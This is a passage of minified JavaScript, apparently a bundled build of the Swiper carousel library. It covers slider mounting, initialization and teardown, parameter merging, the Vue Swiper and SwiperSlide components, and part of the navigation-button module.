        if (typeof n == "string" && (n = document.querySelector(n)), !n) return !1;
        n.swiper = s, n.parentNode && n.parentNode.host && n.parentNode.host.nodeName === "SWIPER-CONTAINER" && (s.isElement = !0);
        const i = () => `.${(s.params.wrapperClass||"").trim().split(" ").join(".")}`;
        let o = n && n.shadowRoot && n.shadowRoot.querySelector ? n.shadowRoot.querySelector(i()) : Ct(n, i())[0];
        return !o && s.params.createElements && (o = fi("div", s.params.wrapperClass), n.append(o), Ct(n, `.${s.params.slideClass}`).forEach(l => {
            o.append(l)
        })), Object.assign(s, {
            el: n,
            wrapperEl: o,
            slidesEl: s.isElement && !n.parentNode.host.slideSlots ? n.parentNode.host : o,
            hostEl: s.isElement ? n.parentNode.host : n,
            mounted: !0,
            rtl: n.dir.toLowerCase() === "rtl" || Ut(n, "direction") === "rtl",
            rtlTranslate: s.params.direction === "horizontal" && (n.dir.toLowerCase() === "rtl" || Ut(n, "direction") === "rtl"),
            wrongRTL: Ut(o, "display") === "-webkit-box"
        }), !0
    }
    init(t) {
        const s = this;
        if (s.initialized || s.mount(t) === !1) return s;
        s.emit("beforeInit"), s.params.breakpoints && s.setBreakpoint(), s.addClasses(), s.updateSize(), s.updateSlides(), s.params.watchOverflow && s.checkOverflow(), s.params.grabCursor && s.enabled && s.setGrabCursor(), s.params.loop && s.virtual && s.params.virtual.enabled ? s.slideTo(s.params.initialSlide + s.virtual.slidesBefore, 0, s.params.runCallbacksOnInit, !1, !0) : s.slideTo(s.params.initialSlide, 0, s.params.runCallbacksOnInit, !1, !0), s.params.loop && s.loopCreate(), s.attachEvents();
        const i = [...s.el.querySelectorAll('[loading="lazy"]')];
        return s.isElement && i.push(...s.hostEl.querySelectorAll('[loading="lazy"]')), i.forEach(r => {
            r.complete ? ei(s, r) : r.addEventListener("load", o => {
                ei(s, o.target)
            })
        }), qr(s), s.initialized = !0, qr(s), s.emit("init"), s.emit("afterInit"), s
    }
    destroy(t, s) {
        t === void 0 && (t = !0), s === void 0 && (s = !0);
        const n = this,
            {
                params: i,
                el: r,
                wrapperEl: o,
                slides: l
            } = n;
        return typeof n.params > "u" || n.destroyed || (n.emit("beforeDestroy"), n.initialized = !1, n.detachEvents(), i.loop && n.loopDestroy(), s && (n.removeClasses(), r.removeAttribute("style"), o.removeAttribute("style"), l && l.length && l.forEach(a => {
            a.classList.remove(i.slideVisibleClass, i.slideFullyVisibleClass, i.slideActiveClass, i.slideNextClass, i.slidePrevClass), a.removeAttribute("style"), a.removeAttribute("data-swiper-slide-index")
        })), n.emit("destroy"), Object.keys(n.eventsListeners).forEach(a => {
            n.off(a)
        }), t !== !1 && (n.el.swiper = null, s0(n)), n.destroyed = !0), null
    }
    static extendDefaults(t) {
        Je(vr, t)
    }
    static get extendedDefaults() {
        return vr
    }
    static get defaults() {
        return Kr
    }
    static installModule(t) {
        It.prototype.__modules__ || (It.prototype.__modules__ = []);
        const s = It.prototype.__modules__;
        typeof t == "function" && s.indexOf(t) < 0 && s.push(t)
    }
    static use(t) {
        return Array.isArray(t) ? (t.forEach(s => It.installModule(s)), It) : (It.installModule(t), It)
    }
};
Object.keys(mr).forEach(e => {
    Object.keys(mr[e]).forEach(t => {
        Ho.prototype[t] = mr[e][t]
    })
});
Ho.use([u0, h0]);
const vd = ["eventsPrefix", "injectStyles", "injectStylesUrls", "modules", "init", "_direction", "oneWayMovement", "touchEventsTarget", "initialSlide", "_speed", "cssMode", "updateOnWindowResize", "resizeObserver", "nested", "focusableElements", "_enabled", "_width", "_height", "preventInteractionOnTransition", "userAgent", "url", "_edgeSwipeDetection", "_edgeSwipeThreshold", "_freeMode", "_autoHeight", "setWrapperSize", "virtualTranslate", "_effect", "breakpoints", "breakpointsBase", "_spaceBetween", "_slidesPerView", "maxBackfaceHiddenSlides", "_grid", "_slidesPerGroup", "_slidesPerGroupSkip", "_slidesPerGroupAuto", "_centeredSlides", "_centeredSlidesBounds", "_slidesOffsetBefore", "_slidesOffsetAfter", "normalizeSlideIndex", "_centerInsufficientSlides", "_watchOverflow", "roundLengths", "touchRatio", "touchAngle", "simulateTouch", "_shortSwipes", "_longSwipes", "longSwipesRatio", "longSwipesMs", "_followFinger", "allowTouchMove", "_threshold", "touchMoveStopPropagation", "touchStartPreventDefault", "touchStartForcePreventDefault", "touchReleaseOnEdges", "uniqueNavElements", "_resistance", "_resistanceRatio", "_watchSlidesProgress", "_grabCursor", "preventClicks", "preventClicksPropagation", "_slideToClickedSlide", "_loop", "loopAdditionalSlides", "loopAddBlankSlides", "loopPreventsSliding", "_rewind", "_allowSlidePrev", "_allowSlideNext", "_swipeHandler", "_noSwiping", "noSwipingClass", "noSwipingSelector", "passiveListeners", "containerModifierClass", "slideClass", "slideActiveClass", "slideVisibleClass", "slideFullyVisibleClass", "slideNextClass", "slidePrevClass", "slideBlankClass", "wrapperClass", "lazyPreloaderClass", "lazyPreloadPrevNext", "runCallbacksOnInit", "observer", "observeParents", "observeSlideChildren", "a11y", "_autoplay", "_controller", "coverflowEffect", "cubeEffect", "fadeEffect", "flipEffect", "creativeEffect", "cardsEffect", "hashNavigation", "history", "keyboard", "mousewheel", "_navigation", "_pagination", "parallax", "_scrollbar", "_thumbs", "virtual", "zoom", "control"];

function fs(e) {
    return typeof e == "object" && e !== null && e.constructor && Object.prototype.toString.call(e).slice(8, -1) === "Object" && !e.__swiper__
}

function As(e, t) {
    const s = ["__proto__", "constructor", "prototype"];
    Object.keys(t).filter(n => s.indexOf(n) < 0).forEach(n => {
        typeof e[n] > "u" ? e[n] = t[n] : fs(t[n]) && fs(e[n]) && Object.keys(t[n]).length > 0 ? t[n].__swiper__ ? e[n] = t[n] : As(e[n], t[n]) : e[n] = t[n]
    })
}

function yd(e) {
    return e === void 0 && (e = {}), e.navigation && typeof e.navigation.nextEl > "u" && typeof e.navigation.prevEl > "u"
}

function bd(e) {
    return e === void 0 && (e = {}), e.pagination && typeof e.pagination.el > "u"
}

function wd(e) {
    return e === void 0 && (e = {}), e.scrollbar && typeof e.scrollbar.el > "u"
}

function xd(e) {
    e === void 0 && (e = "");
    const t = e.split(" ").map(n => n.trim()).filter(n => !!n),
        s = [];
    return t.forEach(n => {
        s.indexOf(n) < 0 && s.push(n)
    }), s.join(" ")
}

function b2(e) {
    return e === void 0 && (e = ""), e ? e.includes("swiper-wrapper") ? e : `swiper-wrapper ${e}` : "swiper-wrapper"
}

function w2(e) {
    let {
        swiper: t,
        slides: s,
        passedParams: n,
        changedParams: i,
        nextEl: r,
        prevEl: o,
        scrollbarEl: l,
        paginationEl: a
    } = e;
    const c = i.filter(N => N !== "children" && N !== "direction" && N !== "wrapperClass"),
        {
            params: d,
            pagination: p,
            navigation: u,
            scrollbar: g,
            virtual: w,
            thumbs: b
        } = t;
    let S, x, v, y, C, L, M, se;
    i.includes("thumbs") && n.thumbs && n.thumbs.swiper && d.thumbs && !d.thumbs.swiper && (S = !0), i.includes("controller") && n.controller && n.controller.control && d.controller && !d.controller.control && (x = !0), i.includes("pagination") && n.pagination && (n.pagination.el || a) && (d.pagination || d.pagination === !1) && p && !p.el && (v = !0), i.includes("scrollbar") && n.scrollbar && (n.scrollbar.el || l) && (d.scrollbar || d.scrollbar === !1) && g && !g.el && (y = !0), i.includes("navigation") && n.navigation && (n.navigation.prevEl || o) && (n.navigation.nextEl || r) && (d.navigation || d.navigation === !1) && u && !u.prevEl && !u.nextEl && (C = !0);
    const W = N => {
        t[N] && (t[N].destroy(), N === "navigation" ? (t.isElement && (t[N].prevEl.remove(), t[N].nextEl.remove()), d[N].prevEl = void 0, d[N].nextEl = void 0, t[N].prevEl = void 0, t[N].nextEl = void 0) : (t.isElement && t[N].el.remove(), d[N].el = void 0, t[N].el = void 0))
    };
    i.includes("loop") && t.isElement && (d.loop && !n.loop ? L = !0 : !d.loop && n.loop ? M = !0 : se = !0), c.forEach(N => {
        if (fs(d[N]) && fs(n[N])) Object.assign(d[N], n[N]), (N === "navigation" || N === "pagination" || N === "scrollbar") && "enabled" in n[N] && !n[N].enabled && W(N);
        else {
            const P = n[N];
            (P === !0 || P === !1) && (N === "navigation" || N === "pagination" || N === "scrollbar") ? P === !1 && W(N): d[N] = n[N]
        }
    }), c.includes("controller") && !x && t.controller && t.controller.control && d.controller && d.controller.control && (t.controller.control = d.controller.control), i.includes("children") && s && w && d.virtual.enabled ? (w.slides = s, w.update(!0)) : i.includes("virtual") && w && d.virtual.enabled && (s && (w.slides = s), w.update(!0)), i.includes("children") && s && d.loop && (se = !0), S && b.init() && b.update(!0), x && (t.controller.control = d.controller.control), v && (t.isElement && (!a || typeof a == "string") && (a = document.createElement("div"), a.classList.add("swiper-pagination"), a.part.add("pagination"), t.el.appendChild(a)), a && (d.pagination.el = a), p.init(), p.render(), p.update()), y && (t.isElement && (!l || typeof l == "string") && (l = document.createElement("div"), l.classList.add("swiper-scrollbar"), l.part.add("scrollbar"), t.el.appendChild(l)), l && (d.scrollbar.el = l), g.init(), g.updateSize(), g.setTranslate()), C && (t.isElement && ((!r || typeof r == "string") && (r = document.createElement("div"), r.classList.add("swiper-button-next"), r.innerHTML = t.hostEl.constructor.nextButtonSvg, r.part.add("button-next"), t.el.appendChild(r)), (!o || typeof o == "string") && (o = document.createElement("div"), o.classList.add("swiper-button-prev"), o.innerHTML = t.hostEl.constructor.prevButtonSvg, o.part.add("button-prev"), t.el.appendChild(o))), r && (d.navigation.nextEl = r), o && (d.navigation.prevEl = o), u.init(), u.update()), i.includes("allowSlideNext") && (t.allowSlideNext = n.allowSlideNext), i.includes("allowSlidePrev") && (t.allowSlidePrev = n.allowSlidePrev), i.includes("direction") && t.changeDirection(n.direction, !1), (L || se) && t.loopDestroy(), (M || se) && t.loopCreate(), t.update()
}

function Cl(e, t) {
    e === void 0 && (e = {}), t === void 0 && (t = !0);
    const s = {
            on: {}
        },
        n = {},
        i = {};
    As(s, Kr), s._emitClasses = !0, s.init = !1;
    const r = {},
        o = vd.map(a => a.replace(/_/, "")),
        l = Object.assign({}, e);
    return Object.keys(l).forEach(a => {
        typeof e[a] > "u" || (o.indexOf(a) >= 0 ? fs(e[a]) ? (s[a] = {}, i[a] = {}, As(s[a], e[a]), As(i[a], e[a])) : (s[a] = e[a], i[a] = e[a]) : a.search(/on[A-Z]/) === 0 && typeof e[a] == "function" ? t ? n[`${a[2].toLowerCase()}${a.substr(3)}`] = e[a] : s.on[`${a[2].toLowerCase()}${a.substr(3)}`] = e[a] : r[a] = e[a])
    }), ["navigation", "pagination", "scrollbar"].forEach(a => {
        s[a] === !0 && (s[a] = {}), s[a] === !1 && delete s[a]
    }), {
        params: s,
        passedParams: i,
        rest: r,
        events: n
    }
}

function x2(e, t) {
    let {
        el: s,
        nextEl: n,
        prevEl: i,
        paginationEl: r,
        scrollbarEl: o,
        swiper: l
    } = e;
    yd(t) && n && i && (l.params.navigation.nextEl = n, l.originalParams.navigation.nextEl = n, l.params.navigation.prevEl = i, l.originalParams.navigation.prevEl = i), bd(t) && r && (l.params.pagination.el = r, l.originalParams.pagination.el = r), wd(t) && o && (l.params.scrollbar.el = o, l.originalParams.scrollbar.el = o), l.init(s)
}

function _2(e, t, s, n, i) {
    const r = [];
    if (!t) return r;
    const o = a => {
        r.indexOf(a) < 0 && r.push(a)
    };
    if (s && n) {
        const a = n.map(i),
            c = s.map(i);
        a.join("") !== c.join("") && o("children"), n.length !== s.length && o("children")
    }
    return vd.filter(a => a[0] === "_").map(a => a.replace(/_/, "")).forEach(a => {
        if (a in e && a in t)
            if (fs(e[a]) && fs(t[a])) {
                const c = Object.keys(e[a]),
                    d = Object.keys(t[a]);
                c.length !== d.length ? o(a) : (c.forEach(p => {
                    e[a][p] !== t[a][p] && o(a)
                }), d.forEach(p => {
                    e[a][p] !== t[a][p] && o(a)
                }))
            } else e[a] !== t[a] && o(a)
    }), r
}
const C2 = e => {
    !e || e.destroyed || !e.params.virtual || e.params.virtual && !e.params.virtual.enabled || (e.updateSlides(), e.updateProgress(), e.updateSlidesClasses(), e.parallax && e.params.parallax && e.params.parallax.enabled && e.parallax.setTranslate())
};

function yr(e, t, s) {
    e === void 0 && (e = {});
    const n = [],
        i = {
            "container-start": [],
            "container-end": [],
            "wrapper-start": [],
            "wrapper-end": []
        },
        r = (o, l) => {
            Array.isArray(o) && o.forEach(a => {
                const c = typeof a.type == "symbol";
                l === "default" && (l = "container-end"), c && a.children ? r(a.children, l) : a.type && (a.type.name === "SwiperSlide" || a.type.name === "AsyncComponentWrapper") ? n.push(a) : i[l] && i[l].push(a)
            })
        };
    return Object.keys(e).forEach(o => {
        if (typeof e[o] != "function") return;
        const l = e[o]();
        r(l, o)
    }), s.value = t.value, t.value = n, {
        slides: n,
        slots: i
    }
}

function S2(e, t, s) {
    if (!s) return null;
    const n = d => {
            let p = d;
            return d < 0 ? p = t.length + d : p >= t.length && (p = p - t.length), p
        },
        i = e.value.isHorizontal() ? {
            [e.value.rtlTranslate ? "right" : "left"]: `${s.offset}px`
        } : {
            top: `${s.offset}px`
        },
        {
            from: r,
            to: o
        } = s,
        l = e.value.params.loop ? -t.length : 0,
        a = e.value.params.loop ? t.length * 2 : t.length,
        c = [];
    for (let d = l; d < a; d += 1) d >= r && d <= o && c.push(t[n(d)]);
    return c.map(d => (d.props || (d.props = {}), d.props.style || (d.props.style = {}), d.props.swiperRef = e, d.props.style = i, et(d.type, { ...d.props
    }, d.children)))
}
const Vo = {
        name: "Swiper",
        props: {
            tag: {
                type: String,
                default: "div"
            },
            wrapperTag: {
                type: String,
                default: "div"
            },
            modules: {
                type: Array,
                default: void 0
            },
            init: {
                type: Boolean,
                default: void 0
            },
            direction: {
                type: String,
                default: void 0
            },
            oneWayMovement: {
                type: Boolean,
                default: void 0
            },
            touchEventsTarget: {
                type: String,
                default: void 0
            },
            initialSlide: {
                type: Number,
                default: void 0
            },
            speed: {
                type: Number,
                default: void 0
            },
            cssMode: {
                type: Boolean,
                default: void 0
            },
            updateOnWindowResize: {
                type: Boolean,
                default: void 0
            },
            resizeObserver: {
                type: Boolean,
                default: void 0
            },
            nested: {
                type: Boolean,
                default: void 0
            },
            focusableElements: {
                type: String,
                default: void 0
            },
            width: {
                type: Number,
                default: void 0
            },
            height: {
                type: Number,
                default: void 0
            },
            preventInteractionOnTransition: {
                type: Boolean,
                default: void 0
            },
            userAgent: {
                type: String,
                default: void 0
            },
            url: {
                type: String,
                default: void 0
            },
            edgeSwipeDetection: {
                type: [Boolean, String],
                default: void 0
            },
            edgeSwipeThreshold: {
                type: Number,
                default: void 0
            },
            autoHeight: {
                type: Boolean,
                default: void 0
            },
            setWrapperSize: {
                type: Boolean,
                default: void 0
            },
            virtualTranslate: {
                type: Boolean,
                default: void 0
            },
            effect: {
                type: String,
                default: void 0
            },
            breakpoints: {
                type: Object,
                default: void 0
            },
            spaceBetween: {
                type: [Number, String],
                default: void 0
            },
            slidesPerView: {
                type: [Number, String],
                default: void 0
            },
            maxBackfaceHiddenSlides: {
                type: Number,
                default: void 0
            },
            slidesPerGroup: {
                type: Number,
                default: void 0
            },
            slidesPerGroupSkip: {
                type: Number,
                default: void 0
            },
            slidesPerGroupAuto: {
                type: Boolean,
                default: void 0
            },
            centeredSlides: {
                type: Boolean,
                default: void 0
            },
            centeredSlidesBounds: {
                type: Boolean,
                default: void 0
            },
            slidesOffsetBefore: {
                type: Number,
                default: void 0
            },
            slidesOffsetAfter: {
                type: Number,
                default: void 0
            },
            normalizeSlideIndex: {
                type: Boolean,
                default: void 0
            },
            centerInsufficientSlides: {
                type: Boolean,
                default: void 0
            },
            watchOverflow: {
                type: Boolean,
                default: void 0
            },
            roundLengths: {
                type: Boolean,
                default: void 0
            },
            touchRatio: {
                type: Number,
                default: void 0
            },
            touchAngle: {
                type: Number,
                default: void 0
            },
            simulateTouch: {
                type: Boolean,
                default: void 0
            },
            shortSwipes: {
                type: Boolean,
                default: void 0
            },
            longSwipes: {
                type: Boolean,
                default: void 0
            },
            longSwipesRatio: {
                type: Number,
                default: void 0
            },
            longSwipesMs: {
                type: Number,
                default: void 0
            },
            followFinger: {
                type: Boolean,
                default: void 0
            },
            allowTouchMove: {
                type: Boolean,
                default: void 0
            },
            threshold: {
                type: Number,
                default: void 0
            },
            touchMoveStopPropagation: {
                type: Boolean,
                default: void 0
            },
            touchStartPreventDefault: {
                type: Boolean,
                default: void 0
            },
            touchStartForcePreventDefault: {
                type: Boolean,
                default: void 0
            },
            touchReleaseOnEdges: {
                type: Boolean,
                default: void 0
            },
            uniqueNavElements: {
                type: Boolean,
                default: void 0
            },
            resistance: {
                type: Boolean,
                default: void 0
            },
            resistanceRatio: {
                type: Number,
                default: void 0
            },
            watchSlidesProgress: {
                type: Boolean,
                default: void 0
            },
            grabCursor: {
                type: Boolean,
                default: void 0
            },
            preventClicks: {
                type: Boolean,
                default: void 0
            },
            preventClicksPropagation: {
                type: Boolean,
                default: void 0
            },
            slideToClickedSlide: {
                type: Boolean,
                default: void 0
            },
            loop: {
                type: Boolean,
                default: void 0
            },
            loopedSlides: {
                type: Number,
                default: void 0
            },
            loopPreventsSliding: {
                type: Boolean,
                default: void 0
            },
            rewind: {
                type: Boolean,
                default: void 0
            },
            allowSlidePrev: {
                type: Boolean,
                default: void 0
            },
            allowSlideNext: {
                type: Boolean,
                default: void 0
            },
            swipeHandler: {
                type: Boolean,
                default: void 0
            },
            noSwiping: {
                type: Boolean,
                default: void 0
            },
            noSwipingClass: {
                type: String,
                default: void 0
            },
            noSwipingSelector: {
                type: String,
                default: void 0
            },
            passiveListeners: {
                type: Boolean,
                default: void 0
            },
            containerModifierClass: {
                type: String,
                default: void 0
            },
            slideClass: {
                type: String,
                default: void 0
            },
            slideActiveClass: {
                type: String,
                default: void 0
            },
            slideVisibleClass: {
                type: String,
                default: void 0
            },
            slideFullyVisibleClass: {
                type: String,
                default: void 0
            },
            slideBlankClass: {
                type: String,
                default: void 0
            },
            slideNextClass: {
                type: String,
                default: void 0
            },
            slidePrevClass: {
                type: String,
                default: void 0
            },
            wrapperClass: {
                type: String,
                default: void 0
            },
            lazyPreloaderClass: {
                type: String,
                default: void 0
            },
            lazyPreloadPrevNext: {
                type: Number,
                default: void 0
            },
            runCallbacksOnInit: {
                type: Boolean,
                default: void 0
            },
            observer: {
                type: Boolean,
                default: void 0
            },
            observeParents: {
                type: Boolean,
                default: void 0
            },
            observeSlideChildren: {
                type: Boolean,
                default: void 0
            },
            a11y: {
                type: [Boolean, Object],
                default: void 0
            },
            autoplay: {
                type: [Boolean, Object],
                default: void 0
            },
            controller: {
                type: Object,
                default: void 0
            },
            coverflowEffect: {
                type: Object,
                default: void 0
            },
            cubeEffect: {
                type: Object,
                default: void 0
            },
            fadeEffect: {
                type: Object,
                default: void 0
            },
            flipEffect: {
                type: Object,
                default: void 0
            },
            creativeEffect: {
                type: Object,
                default: void 0
            },
            cardsEffect: {
                type: Object,
                default: void 0
            },
            hashNavigation: {
                type: [Boolean, Object],
                default: void 0
            },
            history: {
                type: [Boolean, Object],
                default: void 0
            },
            keyboard: {
                type: [Boolean, Object],
                default: void 0
            },
            mousewheel: {
                type: [Boolean, Object],
                default: void 0
            },
            navigation: {
                type: [Boolean, Object],
                default: void 0
            },
            pagination: {
                type: [Boolean, Object],
                default: void 0
            },
            parallax: {
                type: [Boolean, Object],
                default: void 0
            },
            scrollbar: {
                type: [Boolean, Object],
                default: void 0
            },
            thumbs: {
                type: Object,
                default: void 0
            },
            virtual: {
                type: [Boolean, Object],
                default: void 0
            },
            zoom: {
                type: [Boolean, Object],
                default: void 0
            },
            grid: {
                type: [Object],
                default: void 0
            },
            freeMode: {
                type: [Boolean, Object],
                default: void 0
            },
            enabled: {
                type: Boolean,
                default: void 0
            }
        },
        emits: ["_beforeBreakpoint", "_containerClasses", "_slideClass", "_slideClasses", "_swiper", "_freeModeNoMomentumRelease", "activeIndexChange", "afterInit", "autoplay", "autoplayStart", "autoplayStop", "autoplayPause", "autoplayResume", "autoplayTimeLeft", "beforeDestroy", "beforeInit", "beforeLoopFix", "beforeResize", "beforeSlideChangeStart", "beforeTransitionStart", "breakpoint", "breakpointsBase", "changeDirection", "click", "disable", "doubleTap", "doubleClick", "destroy", "enable", "fromEdge", "hashChange", "hashSet", "init", "keyPress", "lock", "loopFix", "momentumBounce", "navigationHide", "navigationShow", "navigationPrev", "navigationNext", "observerUpdate", "orientationchange", "paginationHide", "paginationRender", "paginationShow", "paginationUpdate", "progress", "reachBeginning", "reachEnd", "realIndexChange", "resize", "scroll", "scrollbarDragEnd", "scrollbarDragMove", "scrollbarDragStart", "setTransition", "setTranslate", "slidesUpdated", "slideChange", "slideChangeTransitionEnd", "slideChangeTransitionStart", "slideNextTransitionEnd", "slideNextTransitionStart", "slidePrevTransitionEnd", "slidePrevTransitionStart", "slideResetTransitionStart", "slideResetTransitionEnd", "sliderMove", "sliderFirstMove", "slidesLengthChange", "slidesGridLengthChange", "snapGridLengthChange", "snapIndexChange", "swiper", "tap", "toEdge", "touchEnd", "touchMove", "touchMoveOpposite", "touchStart", "transitionEnd", "transitionStart", "unlock", "update", "virtualUpdate", "zoomChange"],
        setup(e, t) {
            let {
                slots: s,
                emit: n
            } = t;
            const {
                tag: i,
                wrapperTag: r
            } = e, o = We("swiper"), l = We(null), a = We(!1), c = We(!1), d = We(null), p = We(null), u = We(null), g = {
                value: []
            }, w = {
                value: []
            }, b = We(null), S = We(null), x = We(null), v = We(null), {
                params: y,
                passedParams: C
            } = Cl(e, !1);
            yr(s, g, w), u.value = C, w.value = g.value;
            const L = () => {
                yr(s, g, w), a.value = !0
            };
            y.onAny = function(W) {
                for (var N = arguments.length, P = new Array(N > 1 ? N - 1 : 0), F = 1; F < N; F++) P[F - 1] = arguments[F];
                n(W, ...P)
            }, Object.assign(y.on, {
                _beforeBreakpoint: L,
                _containerClasses(W, N) {
                    o.value = N
                }
            });
            const M = { ...y
            };
            if (delete M.wrapperClass, p.value = new Ho(M), p.value.virtual && p.value.params.virtual.enabled) {
                p.value.virtual.slides = g.value;
                const W = {
                    cache: !1,
                    slides: g.value,
                    renderExternal: N => {
                        l.value = N
                    },
                    renderExternalUpdate: !1
                };
                As(p.value.params.virtual, W), As(p.value.originalParams.virtual, W)
            }
            Io(() => {
                !c.value && p.value && (p.value.emitSlidesClasses(), c.value = !0);
                const {
                    passedParams: W
                } = Cl(e, !1), N = _2(W, u.value, g.value, w.value, P => P.props && P.props.key);
                u.value = W, (N.length || a.value) && p.value && !p.value.destroyed && w2({
                    swiper: p.value,
                    slides: g.value,
                    passedParams: W,
                    changedParams: N,
                    nextEl: b.value,
                    prevEl: S.value,
                    scrollbarEl: v.value,
                    paginationEl: x.value
                }), a.value = !1
            }), Ts("swiper", p), en(l, () => {
                To(() => {
                    C2(p.value)
                })
            }), Lo(() => {
                d.value && (x2({
                    el: d.value,
                    nextEl: b.value,
                    prevEl: S.value,
                    paginationEl: x.value,
                    scrollbarEl: v.value,
                    swiper: p.value
                }, y), n("swiper", p.value))
            }), No(() => {
                p.value && !p.value.destroyed && p.value.destroy(!0, !1)
            });

            function se(W) {
                return y.virtual ? S2(p, W, l.value) : (W.forEach((N, P) => {
                    N.props || (N.props = {}), N.props.swiperRef = p, N.props.swiperSlideIndex = P
                }), W)
            }
            return () => {
                const {
                    slides: W,
                    slots: N
                } = yr(s, g, w);
                return et(i, {
                    ref: d,
                    class: xd(o.value)
                }, [N["container-start"], et(r, {
                    class: b2(y.wrapperClass)
                }, [N["wrapper-start"], se(W), N["wrapper-end"]]), yd(e) && [et("div", {
                    ref: S,
                    class: "swiper-button-prev"
                }), et("div", {
                    ref: b,
                    class: "swiper-button-next"
                })], wd(e) && et("div", {
                    ref: v,
                    class: "swiper-scrollbar"
                }), bd(e) && et("div", {
                    ref: x,
                    class: "swiper-pagination"
                }), N["container-end"]])
            }
        }
    },
    jo = {
        name: "SwiperSlide",
        props: {
            tag: {
                type: String,
                default: "div"
            },
            swiperRef: {
                type: Object,
                required: !1
            },
            swiperSlideIndex: {
                type: Number,
                default: void 0,
                required: !1
            },
            zoom: {
                type: Boolean,
                default: void 0,
                required: !1
            },
            lazy: {
                type: Boolean,
                default: !1,
                required: !1
            },
            virtualIndex: {
                type: [String, Number],
                default: void 0
            }
        },
        setup(e, t) {
            let {
                slots: s
            } = t, n = !1;
            const {
                swiperRef: i
            } = e, r = We(null), o = We("swiper-slide"), l = We(!1);

            function a(p, u, g) {
                u === r.value && (o.value = g)
            }
            Lo(() => {
                !i || !i.value || (i.value.on("_slideClass", a), n = !0)
            }), Dc(() => {
                n || !i || !i.value || (i.value.on("_slideClass", a), n = !0)
            }), Io(() => {
                !r.value || !i || !i.value || (typeof e.swiperSlideIndex < "u" && (r.value.swiperSlideIndex = e.swiperSlideIndex), i.value.destroyed && o.value !== "swiper-slide" && (o.value = "swiper-slide"))
            }), No(() => {
                !i || !i.value || i.value.off("_slideClass", a)
            });
            const c = ot(() => ({
                isActive: o.value.indexOf("swiper-slide-active") >= 0,
                isVisible: o.value.indexOf("swiper-slide-visible") >= 0,
                isPrev: o.value.indexOf("swiper-slide-prev") >= 0,
                isNext: o.value.indexOf("swiper-slide-next") >= 0
            }));
            Ts("swiperSlide", c);
            const d = () => {
                l.value = !0
            };
            return () => et(e.tag, {
                class: xd(`${o.value}`),
                ref: r,
                "data-swiper-slide-index": typeof e.virtualIndex > "u" && i && i.value && i.value.params.loop ? e.swiperSlideIndex : e.virtualIndex,
                onLoadCapture: d
            }, e.zoom ? et("div", {
                class: "swiper-zoom-container",
                "data-swiper-zoom": typeof e.zoom == "number" ? e.zoom : void 0
            }, [s.default && s.default(c.value), e.lazy && !l.value && et("div", {
                class: "swiper-lazy-preloader"
            })]) : [s.default && s.default(c.value), e.lazy && !l.value && et("div", {
                class: "swiper-lazy-preloader"
            })])
        }
    };

function _d(e, t, s, n) {
    return e.params.createElements && Object.keys(n).forEach(i => {
        if (!s[i] && s.auto === !0) {
            let r = Ct(e.el, `.${n[i]}`)[0];
            r || (r = fi("div", n[i]), r.className = n[i], e.el.append(r)), s[i] = r, t[i] = r
        }
    }), s
}

function E2(e) {
    let {
        swiper: t,
        extendParams: s,
        on: n,
        emit: i
    } = e;
    s({
        navigation: {
            nextEl: null,
            prevEl: null,
            hideOnClick: !1,
            disabledClass: "swiper-button-disabled",
            hiddenClass: "swiper-button-hidden",
            lockClass: "swiper-button-lock",
            navigationDisabledClass: "swiper-navigation-disabled"
        }
    }), t.navigation = {
        nextEl: null,
        prevEl: null
    };
    const r = b => (Array.isArray(b) ? b : [b]).filter(S => !!S);

    function o(b) {
        let S;
        return b && typeof b == "string" && t.isElement && (S = t.el.querySelector(b), S) ? S : (b && (typeof b == "string" && (S = [...document.querySelectorAll(b)]), t.params.uniqueNavElements && typeof b == "string" && S.length > 1 && t.el.querySelectorAll(b).length === 1 && (S = t.el.querySelector(b))), b && !S ? b : S)
    }

    function l(b, S) {
        const x = t.params.navigation;
        b = r(b), b.forEach(v => {
            v && (v.classList[S ? "add" : "remove"](...x.disabledClass.split(" ")), v.tagName === "BUTTON" && (v.disabled = S), t.params.watchOverflow && t.enabled && v.classList[t.isLocked ? "add" : "remove"](x.lockClass))
        })
    }

    function a() {
        const {
            nextEl: b,
            prevEl: S
        } = t.navigation;
        if (t.params.loop) {
            l(S, !1), l(b, !1);
            return
        }
        l(S, t.isBeginning && !t.params.rewind), l(b, t.isEnd && !t.params.rewind)
    }

    function c(b) {
        b.preventDefault(), !(t.isBeginning && !t.params.loop && !t.params.rewind) && (t.slidePrev(), i("navigationPrev"))
    }

    function d(b) {
        b.preventDefault(), !(t.isEnd && !t.params.loop && !t.params.rewind) && (t.slideNext(), i("navigationNext"))
    }

    function p() {
        const b = t.params.navigation;
        if (t.params.navigation = _d(t, t.originalParams.navigation, t.params.navigation, {
                nextEl: "swiper-button-next",
                prevEl: "swiper-button-prev"
            }), !(b.nextEl || b.prevEl)) return;
        let S = o(b.nextEl),
            x = o(b.prevEl);
        Object.assign(t.navigation, {
            nextEl: S,
            prevEl: x
        }), S = r(S), x = r(x);
        const v = (y, C) => {
            y && y.addEventListener("click", C === "next" ? d : c), !t.enabled && y && y.classList.add(...b.lockClass.split(" "))
        };
        S.forEach(y => v(y, "next")), x.forEach(y => v(y, "prev"))
    }

    function u() {
        let {
            nextEl: b,
            prevEl: S
        } = t.navigation;
        b = r(b), S = r(S);
        const x = (v, y) => {
            v.removeEventListener("click", y === "next" ? d : c), v.classList.remove(...t.params.navigation.disabledClass.split(" "))
        };
        b.forEach(v => x(v, "next")), S.forEach(v => x(v, "prev"))
    }
    n("init", () => {
        t.params.navigation.enabled === !1 ? w() : (p(), a())
    }), n("toEdge fromEdge lock unlock", () => {
        a()
    }), n("destroy", () => {
        u()
    }), n("enable disable", () => {
        let {
            nextEl: b,
            prevEl: S
        } = t.navigation;
        if (b = r(b), S = r(S), t.enabled) {
            a();
            return
        }[...b, ...S].filter(x => !!x).forEach(x => x.classList.add(t.params.navigation.lockClass))
    }), n("click", (b, S) => {
        let {
            nextEl: x,
            prevEl: v
        } = t.navigation;
        x = r(x), v = r(v);
        const y = S.target;
        if (t.params.navigation.hideOnClick && !v.includes(y) && !x.includes(y)) {
            if (t.pagination && t.params.pagination && t.params.pagination.clickable && (t.pagination.el === y || t.pagination.el.contains(y))) return;
            let C;
            x.length ? C = x[0].classList.contains(t.params.navigation.hiddenClass) : v.length && (C = v[0].classList.contains(t.params.navigation.hiddenClass)), i(C === !0 ? "navigationShow" : "navigationHide"), [...x, ...v].filter(L => !!L).forEach(L => L.classList.toggle(t.params.navigation.hiddenClass))
        }
    });
    const g = () => {
            t.el.classList.remove(...t.params.navigation.navigationDisabledClass.split(" ")), p(), a()
        },
